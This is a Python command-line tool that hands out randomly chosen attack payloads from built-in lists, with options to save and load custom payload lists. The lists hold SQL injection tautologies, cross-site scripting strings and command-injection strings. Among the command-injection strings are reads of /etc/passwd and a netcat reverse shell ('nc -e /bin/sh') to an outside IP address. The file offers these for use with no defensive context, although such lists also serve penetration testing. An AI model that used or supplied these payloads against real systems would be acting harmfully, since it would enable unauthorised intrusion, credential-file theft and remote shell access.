import random
import json
import os
import argparse

class PayloadGenerator:
    def __init__(self):
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "' OR 'a'='a' --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' OR '1'='1' ({",
            "') OR ('1'='1",
            "' OR ''='",
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\");'></iframe>",
            "<input type='text' onfocus='alert(\"XSS\")'>",
            "javascript:alert('XSS');",
            "'; alert('XSS');",
            "<a href='javascript:alert(\"XSS\")'>Click me</a>",
            "<marquee onstart=alert('XSS')>XSS</marquee>",
        ]
        
        self.cmd_injection_payloads = [
            "; ls",
            "|| ls",
            "& ls",
            "| ls",
            "; cat /etc/passwd",
            "|| cat /etc/passwd",
            "& cat /etc/passwd",
            "| cat /etc/passwd",
            "; nc -e /bin/sh 192.168.0.1 1234",
            "|| nc -e /bin/sh 192.168.0.1 1234",
        ]
        
        self.history = []

    def generate_sql_payload(self):
        payload = random.choice(self.sql_payloads)
        self.history.append(payload)
        return payload
    
    def generate_xss_payload(self):
        payload = random.choice(self.xss_payloads)
        self.history.append(payload)
        return payload
    
    def generate_cmd_injection_payload(self):
        payload = random.choice(self.cmd_injection_payloads)
        self.history.append(payload)
        return payload
    
    def generate_custom_payload(self, payload_list):
        payload = random.choice(payload_list)
        self.history.append(payload)
        return payload
    
    def display_menu(self):
        print("\033[1;34mPayload Generator Menu:\033[0m")
        print("1. Generate \033[1;32mSQL Injection\033[0m Payload")
        print("2. Generate \033[1;32mXSS\033[0m Payload")
        print("3. Generate \033[1;32mCommand Injection\033[0m Payload")
        print("4. Generate \033[1;32mCustom\033[0m Payload")
        print("5. View \033[1;32mHistory\033[0m")
        print("6. Save \033[1;32mCustom\033[0m Payloads to File")
        print("7. Load \033[1;32mCustom\033[0m Payloads from File")
        print("8. \033[1;31mExit\033[0m")
    
    def save_payloads(self, filename, payloads):
        with open(filename, 'w') as file:
            json.dump(payloads, file)
        print(f"Payloads saved to {filename}")

    def load_payloads(self, filename):
        if os.path.exists(filename):
            with open(filename, 'r') as file:
                payloads = json.load(file)
            print(f"Payloads loaded from {filename}")
            return payloads
        else:
            print(f"File {filename} does not exist.")
            return []

    def run(self):
        while True:
            self.display_menu()
            choice = input("\033[1;33mEnter your choice:\033[0m ")
            if choice == '1':
                print(f"Generated SQL Injection Payload: \033[1;32m{self.generate_sql_payload()}\033[0m")
            elif choice == '2':
                print(f"Generated XSS Payload: \033[1;32m{self.generate_xss_payload()}\033[0m")
            elif choice == '3':
                print(f"Generated Command Injection Payload: \033[1;32m{self.generate_cmd_injection_payload()}\033[0m")
            elif choice == '4':
                custom_payloads = input("\033[1;33mEnter custom payloads separated by comma:\033[0m ").split(',')
                print(f"Generated Custom Payload: \033[1;32m{self.generate_custom_payload(custom_payloads)}\033[0m")
            elif choice == '5':
                print("\033[1;34mHistory of Generated Payloads:\033[0m")
                for idx, payload in enumerate(self.history):
                    print(f"{idx + 1}: \033[1;32m{payload}\033[0m")
            elif choice == '6':
                custom_payloads = input("\033[1;33mEnter custom payloads separated by comma to save:\033[0m ").split(',')
                filename = input("\033[1;33mEnter filename to save payloads:\033[0m ")
                self.save_payloads(filename, custom_payloads)
            elif choice == '7':
                filename = input("\033[1;33mEnter filename to load payloads from:\033[0m ")
                loaded_payloads = self.load_payloads(filename)
                if loaded_payloads:
                    print(f"Generated Custom Payload: \033[1;32m{self.generate_custom_payload(loaded_payloads)}\033[0m")
            elif choice == '8':
                break
            else:
                print("\033[1;31mInvalid choice. Please try again.\033[0m")

def main():
    parser = argparse.ArgumentParser(description="Payload Generator Tool")
    parser.add_argument('--sql', action='store_true', help='Generate SQL Injection payload')
    parser.add_argument('--xss', action='store_true', help='Generate XSS payload')
    parser.add_argument('--cmd', action='store_true', help='Generate Command Injection payload')
    parser.add_argument('--custom', type=str, help='Generate Custom payload from a comma-separated list')
    args = parser.parse_args()

    generator = PayloadGenerator()

    if args.sql:
        print(f"Generated SQL Injection Payload: \033[1;32m{generator.generate_sql_payload()}\033[0m")
    elif args.xss:
        print(f"Generated XSS Payload: \033[1;32m{generator.generate_xss_payload()}\033[0m")
    elif args.cmd:
        print(f"Generated Command Injection Payload: \033[1;32m{generator.generate_cmd_injection_payload()}\033[0m")
    elif args.custom:
        custom_payloads = args.custom.split(',')
        print(f"Generated Custom Payload: \033[1;32m{generator.generate_custom_payload(custom_payloads)}\033[0m")
    else:
        generator.run()

if __name__ == "__main__":
    main()
